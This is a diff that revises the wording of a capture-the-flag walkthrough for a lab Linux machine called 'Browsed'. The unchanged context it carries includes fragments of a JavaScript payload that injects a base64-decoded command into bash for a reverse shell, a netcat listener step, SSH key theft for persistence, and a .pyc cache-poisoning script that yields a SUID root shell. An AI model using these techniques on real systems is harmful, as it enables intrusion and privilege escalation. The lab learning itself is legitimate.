@@ -8,10 +8,10 @@
 
 ## Quick overview
 
-A Linux machine (Medium) that presented the following path:
+A Linux machine (Medium) with the following attack path:
 
-1.  → → **USER.TXT**
-2.  → → **ROOT.TXT**
+1.  Extension upload → command injection → reverse shell as `larry` → **USER.TXT**
+2.  `sudo` on extension tool → `.pyc` cache poisoning → SUID bash → root → **ROOT.TXT**
 
 ---
 
@@ -19,19 +19,23 @@ A Linux machine (Medium) that presented the following path:
 
 ### Enumeration
 
-We start with a nmap enummeration that will help us to discover p22 and p80.
+We start with an Nmap scan to discover open ports **22** and **80**.
 
-We try to get p80 via the IP adresse or browsed.htb (by ading it in /etc/hosts)
+We access port 80 using either the IP address or `browsed.htb` (after adding it to `/etc/hosts`).
 
-We will see an interessting entry point Upload Extention, by trying to upload of the samples (i choosed Fontify and i will used by all the writeup).
+We find an interesting entry point: **Upload Extension**.  
+By uploading one of the provided samples (I chose **Fontify**, and I use it for the rest of the writeup), we can begin investigating the extension functionality.
 
-If we scan the displayed logs, we will find browsedinternals.htb, by adding it in /etc/hosts, we will find that host a gitea.
+While reviewing the displayed logs, we discover another virtual host: `browsedinternals.htb`.  
+After adding it to `/etc/hosts`, we find that this host is running a **Gitea** instance.
 
 ![Icon](Images/browsedgitea.png)
 
-### Lets go
+### Exploitation
 
-By analysing the file routines.sh in MarkdownPreview, we will discover arithmetic command injection vulnerability caused by lack of input validation, that we will exploit it for a reverse shell by the following script:
+By analyzing the file `routines.sh` inside the **MarkdownPreview** extension, we discover an **arithmetic command injection** vulnerability caused by missing input validation.
+
+We exploit this vulnerability to get a reverse shell using the following script:
 
 ```js
 const TARGET = "http://localhost:5000/routines/";
@@ -50,11 +54,15 @@ const exploit = "a[$(echo" + sp + b64 + "|base64" + sp + "-d|bash)]";
 fetch(TARGET + exploit, { mode: "no-cors" });
 ```
 
-we replace it in content.js and zip the sample and upload it, in the same we launche netcat in our machine
+We replace the payload in `content.js`, zip the extension again, and upload it.
+
+At the same time, we start a Netcat listener on our machine.
 
 ![Icon](Images/revershellbrowsed.png)
 
-and we are in with larry user, for a better persistance we can take the ssh key and reconnected with it 
+We successfully get a shell as the `larry` user.
+
+For better persistence, we can extract the SSH private key and reconnect via SSH.
 
 ---
 
@@ -62,17 +70,17 @@ and we are in with larry user, for a better persistance we can take the ssh key 
 
 ### Sudo  
 
-By trying using sudo -l we will find     
+Running `sudo -l` shows the following allowed command:
 
-(root) NOPASSWD: /opt/extensiontool/extension_tool.py
+`(root) NOPASSWD: /opt/extensiontool/extension_tool.py`
 
-### Exploiting the PY Cache
+### Exploiting the Python Cache
 
-so by analysing extensiontool we will find that there is a script that compile the py and launche it from the cache.
+By analyzing `extension_tool.py`, we find that the script compiles Python code and executes it from the `.pyc` cache.
 
-so we will creat a script that generate a malicious py cache.
+This allows us to create a malicious `.pyc` file and poison the cache.
 
-then launche it via the extention tool.
+We generate the malicious cache and execute it via the extension tool.
 
 ```python
 #!/usr/bin/env python3
@@ -225,7 +233,7 @@ else:
     print("[*] /tmp/rootbash will be created when you run step 2")
 ```
 
-by lquching the script and following the script we can get the root:
+After running the exploit and following the required steps, we obtain a root shell:
 
 ![Icon](Images/rootbrowsed.png)
 
